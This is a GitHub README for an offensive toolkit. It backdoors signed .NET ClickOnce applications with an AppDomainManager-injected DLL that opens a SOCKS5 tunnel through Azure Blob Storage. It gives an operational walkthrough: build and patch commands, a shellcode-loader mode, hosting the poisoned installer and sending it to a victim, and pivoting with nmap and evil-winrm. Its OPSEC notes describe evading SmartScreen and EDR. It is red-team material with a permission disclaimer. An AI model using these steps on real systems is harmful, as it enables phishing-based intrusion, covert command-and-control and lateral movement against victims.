# https://github.com/dazzyddos/ClickOnceBlobber

[Skip to content](https://github.com/dazzyddos/ClickOnceBlobber#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/dazzyddos/ClickOnceBlobber) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/dazzyddos/ClickOnceBlobber) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/dazzyddos/ClickOnceBlobber) to refresh your session.Dismiss alert

{{ message }}

[dazzyddos](https://github.com/dazzyddos)/ **[ClickOnceBlobber](https://github.com/dazzyddos/ClickOnceBlobber)** Public

- [Notifications](https://github.com/login?return_to=%2Fdazzyddos%2FClickOnceBlobber) You must be signed in to change notification settings
- [Fork\\
20](https://github.com/login?return_to=%2Fdazzyddos%2FClickOnceBlobber)
- [Star\\
159](https://github.com/login?return_to=%2Fdazzyddos%2FClickOnceBlobber)


main

[**1** Branch](https://github.com/dazzyddos/ClickOnceBlobber/branches) [**0** Tags](https://github.com/dazzyddos/ClickOnceBlobber/tags)

[Go to Branches page](https://github.com/dazzyddos/ClickOnceBlobber/branches)[Go to Tags page](https://github.com/dazzyddos/ClickOnceBlobber/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![dazzyddos](https://avatars.githubusercontent.com/u/25081660?v=4&size=40)](https://github.com/dazzyddos)[dazzyddos](https://github.com/dazzyddos/ClickOnceBlobber/commits?author=dazzyddos)<br>[Added Initial Files](https://github.com/dazzyddos/ClickOnceBlobber/commit/4a6ccf2af6c1a334068e74180a1150657bc41d7e)<br>2 months agoFeb 14, 2026<br>[4a6ccf2](https://github.com/dazzyddos/ClickOnceBlobber/commit/4a6ccf2af6c1a334068e74180a1150657bc41d7e) · 2 months agoFeb 14, 2026<br>## History<br>[3 Commits](https://github.com/dazzyddos/ClickOnceBlobber/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/dazzyddos/ClickOnceBlobber/commits/main/) 3 Commits |
| [assets](https://github.com/dazzyddos/ClickOnceBlobber/tree/main/assets "assets") | [assets](https://github.com/dazzyddos/ClickOnceBlobber/tree/main/assets "assets") | [Added Initial Files](https://github.com/dazzyddos/ClickOnceBlobber/commit/7a80bb6c1c94224f69c3c5c9a115af2cc05b34a5 "Added Initial Files") | 2 months agoFeb 14, 2026 |
| [examples](https://github.com/dazzyddos/ClickOnceBlobber/tree/main/examples "examples") | [examples](https://github.com/dazzyddos/ClickOnceBlobber/tree/main/examples "examples") | [Added Initial Files](https://github.com/dazzyddos/ClickOnceBlobber/commit/7a80bb6c1c94224f69c3c5c9a115af2cc05b34a5 "Added Initial Files") | 2 months agoFeb 14, 2026 |
| [README.md](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/README.md "README.md") | [README.md](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/README.md "README.md") | [Added Initial Files](https://github.com/dazzyddos/ClickOnceBlobber/commit/4a6ccf2af6c1a334068e74180a1150657bc41d7e "Added Initial Files") | 2 months agoFeb 14, 2026 |
| [clickonce\_backdoor.py](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/clickonce_backdoor.py "clickonce_backdoor.py") | [clickonce\_backdoor.py](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/clickonce_backdoor.py "clickonce_backdoor.py") | [Added Initial Files](https://github.com/dazzyddos/ClickOnceBlobber/commit/7a80bb6c1c94224f69c3c5c9a115af2cc05b34a5 "Added Initial Files") | 2 months agoFeb 14, 2026 |
| [requirements.txt](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/requirements.txt "requirements.txt") | [requirements.txt](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/requirements.txt "requirements.txt") | [Added Initial Files](https://github.com/dazzyddos/ClickOnceBlobber/commit/7a80bb6c1c94224f69c3c5c9a115af2cc05b34a5 "Added Initial Files") | 2 months agoFeb 14, 2026 |
| View all files |

## Repository files navigation

# ClickOnce AppDomainManager Injection Toolkit

[Permalink: ClickOnce AppDomainManager Injection Toolkit](https://github.com/dazzyddos/ClickOnceBlobber#clickonce-appdomainmanager-injection-toolkit)

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/ClickOnceBlobber.jpg)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/ClickOnceBlobber.jpg)

Weaponize signed .NET ClickOnce applications for initial access by hijacking a dependency DLL via AppDomainManager injection and loading a C# port of ProxyBlob Agent. Ships with a C# port of [ProxyBlob](https://github.com/quarkslab/proxyblob) — a SOCKS5 proxy that tunnels all traffic through Azure Blob Storage, blending into environments where `*.blob.core.windows.net` is whitelisted.

## Why This Works

[Permalink: Why This Works](https://github.com/dazzyddos/ClickOnceBlobber#why-this-works)

ClickOnce is Microsoft's one-click deployment technology for .NET apps. When a user clicks a `.application` URL, Windows downloads and runs the app with no admin privileges required. The attack:

1. Take a **legitimate, signed** ClickOnce application with an existing reputation
2. **Replace** one of its dependency DLLs with the ProxyBlob SOCKS5 agent
3. **Inject** a `.exe.config` that tells the CLR to load our DLL as the AppDomainManager
4. **Patch** the manifest hashes to match our new files
5. **Host** it — the victim clicks the link, gets a real-looking app, and you get a SOCKS5 tunnel

The host `.exe` remains untouched and validly signed. SmartScreen sees a known binary. EDR sees a trusted process loading modules. Your agent communicates only with Azure Blob Storage over HTTPS.

## Repository Structure

[Permalink: Repository Structure](https://github.com/dazzyddos/ClickOnceBlobber#repository-structure)

```
├── clickonce_backdoor.py              # Main script for backdooring ProxyBlob Agent DLL to ClickOnce App
├── examples/
│   ├── ProxyBlobAgent.cs              # ProxyBlob Agent ClickOnce DLL payload (AppDomainManager)
│   ├── ProxyBlobStandalone.cs         # Standalone Proxyblob console agent (for testing)
│   ├── ShellcodeLoader.cs             # Alternative: shellcode loader payload
│   └── MessageBoxPoC.cs               # PoC: message box (validates injection works)
└── README.md
```

## Prerequisites

[Permalink: Prerequisites](https://github.com/dazzyddos/ClickOnceBlobber#prerequisites)

**Attacker (Linux/macOS):**

- Python 3.10+
- [ProxyBlob proxy](https://github.com/quarkslab/proxyblob) (Go binary)
- Azure Storage Account (or [Azurite](https://github.com/Azure/Azurite) for local testing)

**Build machine (Windows):**

- .NET Framework csc.exe — ships at `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe` (auto-detected)
- NuGet CLI — [download](https://www.nuget.org/downloads), place `nuget.exe` next to the script or add to PATH (only needed for `--proxyblob` mode)

The script auto-detects `csc.exe` and `nuget.exe`. For `--proxyblob`, BouncyCastle and ILMerge are auto-installed via NuGet on first run into a `packages/` directory next to the script (persists across runs).

## Architecture Support

[Permalink: Architecture Support](https://github.com/dazzyddos/ClickOnceBlobber#architecture-support)

The agent code is architecture-neutral (no P/Invoke, no shellcode). The `--platform` flag (passed to `csc.exe /platform:`) controls how the CLR loads it:

| `--platform` | Runs on x86 Windows | Runs on x64 Windows | When to use |
| --- | --- | --- | --- |
| `x86` (default) | 32-bit | 32-bit (WoW64) | Target app is x86 |
| `x64` | ✗ | 64-bit | Target app is x64 |
| `anycpu` | 32-bit | 64-bit | Standalone testing, or target is AnyCPU |

Check a target app with `corflags.exe TargetApp.exe` to determine its platform.

* * *

## Usage: End-to-End Walkthrough

[Permalink: Usage: End-to-End Walkthrough](https://github.com/dazzyddos/ClickOnceBlobber#usage-end-to-end-walkthrough)

### Step 1 — Set Up Azure Storage

[Permalink: Step 1 — Set Up Azure Storage](https://github.com/dazzyddos/ClickOnceBlobber#step-1--set-up-azure-storage)

```
# Create storage account
az storage account create \
    --name yourblobaccount \
    --resource-group yourgroup \
    --sku Premium_LRS \
    --kind BlockBlobStorage

# Get keys
az storage account keys list --account-name yourblobaccount --output table
```

Or use Azurite locally:

```
docker run -p 10000:10000 mcr.microsoft.com/azure-storage/azurite
```

### Step 2 — Start ProxyBlob Proxy

[Permalink: Step 2 — Start ProxyBlob Proxy](https://github.com/dazzyddos/ClickOnceBlobber#step-2--start-proxyblob-proxy)

```
git clone https://github.com/quarkslab/proxyblob && cd proxyblob && make

cat > config.json << 'EOF'
{
    "storage_account_name": "yourblobaccount",
    "storage_account_key": "YOUR_KEY_HERE"
}
EOF

./proxy -c config.json
```

In the proxy shell:

```
proxyblob » create
[+] Created container: d646856a-5ae9-4328-bcfc-d85e762aa345
[+] Connection string: aHR0cHM6Ly95b3VyYmxvYmFjY291bnQuYmxvYi5jb3JlLndpbmRvd3MubmV0Ly4uLg==
```

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/ProxyBlob1.png)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/ProxyBlob1.png)

Save that connection string — it goes into the agent.

### Step 3 — Test with Standalone Agent First

[Permalink: Step 3 — Test with Standalone Agent First](https://github.com/dazzyddos/ClickOnceBlobber#step-3--test-with-standalone-agent-first)

Always verify the agent works independently before ClickOnce integration.

On the Windows build machine:

```
# Compile
csc.exe /platform:anycpu /out:ProxyBlobStandalone.exe ^
    examples\ProxyBlobStandalone.cs ^
    /r:packages\BouncyCastle.Cryptography.2.5.1\lib\netstandard2.0\BouncyCastle.Cryptography.dll ^
    /r:System.Net.Http.dll /r:netstandard.dll

# ILMerge into single exe (so BouncyCastle is embedded)
packages\ILMerge.3.0.41\tools\net452\ILMerge.exe ^
    /out:Agent.exe ^
    ProxyBlobStandalone.exe ^
    packages\BouncyCastle.Cryptography.2.5.1\lib\netstandard2.0\BouncyCastle.Cryptography.dll ^
    /targetplatform:v4

# Run
Agent.exe <connection-string>
```

Back on the proxy:

```
proxyblob » list
  d646856a │ username@DESKTOP │ active
proxyblob » select d646856a
proxyblob » start
[+] SOCKS5 proxy listening on 127.0.0.1:1080
```

Test:

```
proxychains curl http://ipconfig.io
```

If this works, proceed to ClickOnce integration.

### Step 4 — Find a Target ClickOnce App

[Permalink: Step 4 — Find a Target ClickOnce App](https://github.com/dazzyddos/ClickOnceBlobber#step-4--find-a-target-clickonce-app)

Find a target ClickOnce app during recon (search for `.application` URLs). You need:

Download the entire ClickOnce deployment:

```
# https://github.com/api0cradle/RedTeamScripts/blob/main/application_downloader.py
python3 application_downloader.py -u https://target-site.com/APPLICATION.application
```

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/appliction_downloader.png)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/appliction_downloader.png)

### Step 5 — Build and Patch in One Command

[Permalink: Step 5 — Build and Patch in One Command](https://github.com/dazzyddos/ClickOnceBlobber#step-5--build-and-patch-in-one-command)

The script auto-compiles the C# source, handles NuGet dependencies (for `--proxyblob`), ILMerges BouncyCastle into the DLL, and patches all manifests — all in a single run:

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/firstrun.png)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/firstrun.png)

```
# ProxyBlob mode — auto-compiles, auto-installs NuGet packages, auto-merges
python clickonce_backdoor.py \
    --input ./APPLICATION.application \
    --url http://YOUR-SERVER \
    --proxyblob "aHR0cHM6Ly95b3VyYmxvYmFjY291bnQ..." \
    --output ./output

# PoC mode — quick validation that injection works
python clickonce_backdoor.py \
    --input ./APPLICATION.application \
    --url http://YOUR-SERVER \
    --poc --output ./output

# Shellcode mode
python clickonce_backdoor.py \
    --input ./APPLICATION.application \
    --url http://YOUR-SERVER \
    --shellcode beacon.bin --output ./output

# x64 target app
python clickonce_backdoor.py \
    --input ./APPLICATION.application \
    --url http://YOUR-SERVER/ \
    --proxyblob "aHR0cHM6Ly95b3VyYmxvYmFjY291bnQ..." \
    --platform x64 --output ./output
```

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/proxyblobexample1.png)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/proxyblobexample1.png)

The script handles: generating the C# source with your settings baked in, compiling via `csc.exe`, ILMerging BouncyCastle (for `--proxyblob`), replacing the DLL, creating `.exe.config` with AppDomainManager injection, adding both files to manifests, recalculating all SHA256 hashes and file sizes, stripping code signatures, zeroing the vendor publicKeyToken, and updating the deployment provider URL.

**Manual override:** You can still use `--payload` to supply a pre-compiled DLL (skips compilation):

```
python clickonce_backdoor.py \
    --input ./APPLICATION.application \
    --url http://YOUR-SERVER \
    --payload payload.dll \
    --output ./output
```

> **⚠️ ILMerge Assembly Name Gotcha:** ILMerge sets the internal assembly name from the **output filename**, not the input. If you merge to `Foo_merged.dll` and then rename the file to `Foo.dll`, the internal name is still `Foo_merged` — the CLR reads metadata, not the filename. The `.exe.config` won't match, and AppDomainManager injection silently fails with no error. The script handles this correctly by ILMerging directly to the final name.

### Step 6 — Host and Deliver

[Permalink: Step 6 — Host and Deliver](https://github.com/dazzyddos/ClickOnceBlobber#step-6--host-and-deliver)

```
# Built-in server with correct MIME types and cache headers
python3 clickonce_backdoor.py serve --port 8000 --dir ./output
```

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/proxyblobexample2.png)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/proxyblobexample2.png)

Or use any web server with these MIME types configured:

```
.application  → application/x-ms-application
.manifest     → application/x-ms-manifest
.deploy       → application/octet-stream
```

Send the victim: `http://YOUR-SERVER/APPLICATION.application`

They click Install → the app runs → your SOCKS5 tunnel opens.

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/proxyblobexample3.png)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/proxyblobexample3.png)

### Step 7 — Use the Tunnel

[Permalink: Step 7 — Use the Tunnel](https://github.com/dazzyddos/ClickOnceBlobber#step-7--use-the-tunnel)

```
# On the proxy machine
proxyblob » list
proxyblob » select <container-id>
proxyblob » start

# SOCKS5 on 127.0.0.1:1080
proxychains nmap -sT -Pn 10.0.0.0/24
proxychains evil-winrm -i 10.0.0.50 -u admin -p password
proxychains curl http://internal-app.corp.local
```

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/proxyblobexample4.png)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/proxyblobexample4.png)

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/proxyblobexample5.png)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/proxyblobexample5.png)

[![](https://github.com/dazzyddos/ClickOnceBlobber/raw/main/assets/proxyblobexample6.png)](https://github.com/dazzyddos/ClickOnceBlobber/blob/main/assets/proxyblobexample6.png)

* * *

## Troubleshooting

[Permalink: Troubleshooting](https://github.com/dazzyddos/ClickOnceBlobber#troubleshooting)

### Compilation

[Permalink: Compilation](https://github.com/dazzyddos/ClickOnceBlobber#compilation)

| Error | Fix |
| --- | --- |
| `csc.exe not found` | Install .NET Framework 4.x or add `csc.exe` to PATH |
| `nuget.exe not found` | Download from nuget.org, place next to script or add to PATH |
| `CS0012: type 'Object' ... netstandard` | Add `/r:netstandard.dll` to the csc command |
| `Metadata file ... net461 ... not found` | Use the `netstandard2.0` BouncyCastle path |

### Runtime

[Permalink: Runtime](https://github.com/dazzyddos/ClickOnceBlobber#runtime)

| Symptom | Cause | Fix |
| --- | --- | --- |
| `FileNotFoundException: BouncyCastle.Cryptography` | DLL not embedded | Use ILMerge to create single DLL |
| AppDomainManager not loading after ClickOnce run | Internal assembly name mismatch | Assembly name must match `.exe.config`. Check with `ildasm /text Dll.dll | findstr ".assembly"` |
| Agent exits with code 3 | Connection string invalid or expired | Regenerate with `create` in proxy |
| ClickOnce install fails silently | Manifest hash mismatch | Re-run automation script or recalculate SHA256 hashes manually |
| `RefDefValidation` error during install | Third-party DLL strong-name token zeroed | The script only zeros the vendor token. Use `--dll-name` to set the payload DLL name if needed |

### ClickOnce Cache

[Permalink: ClickOnce Cache](https://github.com/dazzyddos/ClickOnceBlobber#clickonce-cache)

Clear between test deployments:

```
rundll32 dfshim CleanOnlineAppCache
```

### Diagnostic Mode

[Permalink: Diagnostic Mode](https://github.com/dazzyddos/ClickOnceBlobber#diagnostic-mode)

For debugging, use `ProxyBlobStandalone.cs` first — it writes detailed logs to stderr showing packet types, connection events, and errors. Once confirmed working, switch to `ProxyBlobAgent.cs` for ClickOnce integration.

* * *

## How the C\# Agent Works

[Permalink: How the C# Agent Works](https://github.com/dazzyddos/ClickOnceBlobber#how-the-c-agent-works)

The agent is a faithful port of the [Go ProxyBlob agent](https://github.com/quarkslab/proxyblob/blob/main/cmd/agent/main.go). Three critical bugs were found and fixed during the port:

**1\. UUID Byte Order** — Go's `uuid.UUID` stores 16 bytes in RFC 4122 (big-endian) order. .NET's `Guid` constructor swaps the first 3 components to little-endian, causing ConnectionID mismatches on the wire. Fixed by using raw `byte[16]` arrays.

**2\. XChaCha20-Poly1305** — Go uses `chacha20poly1305.NewX()` = XChaCha20 with 24-byte nonces. BouncyCastle's `ChaCha20Poly1305` only supports 12-byte IETF nonces. Fixed by implementing HChaCha20 subkey derivation:

```
subkey     = HChaCha20(key, nonce[0:16])     // ChaCha20 quarter-rounds on key+nonce
ietf_nonce = 0x00000000 || nonce[16:24]      // Remaining 8 bytes become IETF nonce
ciphertext = ChaCha20Poly1305(subkey, ietf_nonce, plaintext)
```

**3\. Base64 Padding** — Go uses `base64.RawStdEncoding` (no `=` padding). .NET requires padding. Fixed by auto-padding before decode.

### Protocol

[Permalink: Protocol](https://github.com/dazzyddos/ClickOnceBlobber#protocol)

```
Packet: [Command:1B][ConnectionID:16B][DataLength:4B BE][Payload:var]
Commands: NEW(0x01) ACK(0x02) DATA(0x03) CLOSE(0x04)

Key Exchange:
  Proxy  → Agent: CmdNew  [nonce:24][pubkey:32]
  Agent  → Proxy: CmdAck  [agentPubkey:32]
  Symmetric key:  HKDF-SHA3-256(X25519(privA, pubB), salt=nonce, info=nil)
  Encryption:     XChaCha20-Poly1305 on all CmdData payloads

Blob Transport:
  info     — username@hostname XOR 0xDEADB10B
  request  — proxy→agent (agent polls, reads, clears)
  response — agent→proxy (agent writes, proxy reads, clears)
  Polling: exponential backoff 50ms → 3s (×1.5)
```

* * *

## OPSEC Notes

[Permalink: OPSEC Notes](https://github.com/dazzyddos/ClickOnceBlobber#opsec-notes)

- Traffic goes only to `*.blob.core.windows.net` over HTTPS — blends with legitimate Azure traffic
- No Azure SDK — raw HTTP REST API with SAS token auth (smaller binary, fewer imports to flag)
- Single DLL via ILMerge — no additional files dropped alongside the app
- Host `.exe` stays validly signed — only the dependency DLL and `.config` are modified
- Agent runs as a foreground thread — survives host app exit without spawning a new process
- Process appears in Task Manager as the legitimate app name (e.g., `APPLICATION`)

* * *

## Credits

[Permalink: Credits](https://github.com/dazzyddos/ClickOnceBlobber#credits)

- [Claude.ai](https://claude.ai/)
- [ProxyBlob](https://github.com/quarkslab/proxyblob) — Quarkslab (Alexandre Nesic)
- [ClickOnce Research](https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1571c6b96a95) — SpecterOps (Nick Powers & Steven Flores)

## Disclaimer

[Permalink: Disclaimer](https://github.com/dazzyddos/ClickOnceBlobber#disclaimer)

This tool is for authorized security testing and research only. Only use against systems you have explicit written permission to test.

## About

Weaponize signed .NET ClickOnce applications for initial access by hijacking a dependency DLL via AppDomainManager injection and loading a C# port of ProxyBlob Agent.


### Resources

[Readme](https://github.com/dazzyddos/ClickOnceBlobber#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/dazzyddos/ClickOnceBlobber).

[Activity](https://github.com/dazzyddos/ClickOnceBlobber/activity)

### Stars

[**159**\\
stars](https://github.com/dazzyddos/ClickOnceBlobber/stargazers)

### Watchers

[**0**\\
watching](https://github.com/dazzyddos/ClickOnceBlobber/watchers)

### Forks

[**20**\\
forks](https://github.com/dazzyddos/ClickOnceBlobber/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fdazzyddos%2FClickOnceBlobber&report=dazzyddos+%28user%29)

## [Releases](https://github.com/dazzyddos/ClickOnceBlobber/releases)

No releases published

## [Packages\  0](https://github.com/users/dazzyddos/packages?repo_name=ClickOnceBlobber)

No packages published

## [Contributors\  1](https://github.com/dazzyddos/ClickOnceBlobber/graphs/contributors)

- [![@dazzyddos](https://avatars.githubusercontent.com/u/25081660?s=64&v=4)](https://github.com/dazzyddos)[**dazzyddos** Arun Nair](https://github.com/dazzyddos)

## Languages

- [Python100.0%](https://github.com/dazzyddos/ClickOnceBlobber/search?l=python)

You can’t perform that action at this time.